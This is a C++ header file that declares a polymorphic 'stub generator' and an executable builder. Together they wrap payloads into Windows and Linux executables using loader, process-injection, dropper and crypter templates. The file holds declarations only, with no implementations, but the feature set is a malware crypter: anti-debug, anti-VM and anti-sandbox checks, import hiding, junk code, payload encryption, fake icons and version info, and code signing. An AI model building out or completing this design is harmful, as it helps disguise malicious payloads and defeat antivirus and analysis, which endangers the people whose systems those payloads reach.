#ifndef STUB_GENERATOR_H
#define STUB_GENERATOR_H

#include <vector>
#include <string>
#include <cstdint>
#include <memory>
#include <random>

// Polymorphic stub generator
class StubGenerator {
public:
    // Stub configuration options
    struct StubConfig {
        bool antiDebug = true;
        bool antiVM = true;
        bool obfuscateCode = true;
        bool compressPayload = true;
        bool encryptPayload = true;
        bool hideImports = true;
        bool addJunkCode = true;
        bool randomizeLayout = true;
        std::string iconPath;
        std::string versionInfo;
        std::vector<uint8_t> encryptionKey;
    };

    // Stub template types
    enum class StubTemplate {
        BASIC_LOADER,           // Simple payload loader
        PROCESS_INJECTION,      // Inject into another process
        MEMORY_EXECUTE,         // Execute from memory
        DROPPER,                // Drop and execute file
        CRYPTER,                // Encrypt/decrypt payload
        POLYMORPHIC_ENGINE      // Full polymorphic engine
    };

    StubGenerator();
    ~StubGenerator();

    // Generate a unique polymorphic stub
    std::vector<uint8_t> generateStub(StubTemplate type, const StubConfig& config);
    
    // Attach payload to stub
    bool attachPayload(std::vector<uint8_t>& stub, const std::vector<uint8_t>& payload);
    
    // Create executable from stub
    bool createExecutable(const std::string& outputPath, const std::vector<uint8_t>& stub);
    
    // Generate random stub variations
    void randomizeStub(std::vector<uint8_t>& stub);
    
    // Add polymorphic layers
    void addPolymorphicLayer(std::vector<uint8_t>& stub);
    
    // Obfuscation techniques
    void addJunkCode(std::vector<uint8_t>& stub);
    void obfuscateInstructions(std::vector<uint8_t>& stub);
    void encryptSections(std::vector<uint8_t>& stub);
    
    // Anti-analysis features
    void addAntiDebug(std::vector<uint8_t>& stub);
    void addAntiVM(std::vector<uint8_t>& stub);
    void addAntiSandbox(std::vector<uint8_t>& stub);
    
    // Get stub statistics
    size_t getStubSize() const { return currentStubSize; }
    std::string getStubHash() const;

private:
    std::mt19937 rng;
    size_t currentStubSize;
    
    // Internal stub generation methods
    std::vector<uint8_t> generateBaseStub(StubTemplate type);
    std::vector<uint8_t> generatex86Stub();
    std::vector<uint8_t> generatex64Stub();
    
    // Polymorphic engine components
    std::vector<uint8_t> generateDecryptor();
    std::vector<uint8_t> generateLoader();
    std::vector<uint8_t> generateAntiAnalysis();
    
    // Code mutation techniques
    void mutateCode(std::vector<uint8_t>& code);
    void insertNops(std::vector<uint8_t>& code);
    void substitueInstructions(std::vector<uint8_t>& code);
    void reorderInstructions(std::vector<uint8_t>& code);
    
    // Encryption engines
    std::vector<uint8_t> generateXorEngine();
    std::vector<uint8_t> generateRC4Engine();
    std::vector<uint8_t> generateCustomCryptoEngine();
};

// Drag and drop handler
class DragDropHandler {
public:
    DragDropHandler();
    ~DragDropHandler();
    
    // Initialize drag-drop support
    bool initialize();
    
    // Check if files were dropped
    bool hasDroppedFiles() const;
    
    // Get dropped file paths
    std::vector<std::string> getDroppedFiles();
    
    // Clear dropped files
    void clearDroppedFiles();
    
    // Enable/disable drag-drop
    void setEnabled(bool enabled);

private:
    bool enabled;
    std::vector<std::string> droppedFiles;
    
#ifdef _WIN32
    void* hwnd;  // Window handle for drag-drop
#endif
};

// Executable builder
class ExecutableBuilder {
public:
    // PE/ELF executable types
    enum class ExeType {
        PE32,       // 32-bit Windows PE
        PE64,       // 64-bit Windows PE
        ELF32,      // 32-bit Linux ELF
        ELF64,      // 64-bit Linux ELF
        UNIVERSAL   // Cross-platform
    };
    
    ExecutableBuilder();
    ~ExecutableBuilder();
    
    // Build executable from stub and payload
    bool buildExecutable(
        const std::string& outputPath,
        const std::vector<uint8_t>& stub,
        const std::vector<uint8_t>& payload,
        ExeType type
    );
    
    // Add resources to executable
    bool addIcon(const std::string& iconPath);
    bool addVersionInfo(const std::string& info);
    bool addManifest(const std::string& manifest);
    
    // Sign executable (if certificate available)
    bool signExecutable(const std::string& certPath);
    
    // Compress executable
    bool compressExecutable(const std::string& exePath);

private:
    std::vector<uint8_t> buildPE32(const std::vector<uint8_t>& stub, const std::vector<uint8_t>& payload);
    std::vector<uint8_t> buildPE64(const std::vector<uint8_t>& stub, const std::vector<uint8_t>& payload);
    std::vector<uint8_t> buildELF32(const std::vector<uint8_t>& stub, const std::vector<uint8_t>& payload);
    std::vector<uint8_t> buildELF64(const std::vector<uint8_t>& stub, const std::vector<uint8_t>& payload);
};

#endif // STUB_GENERATOR_H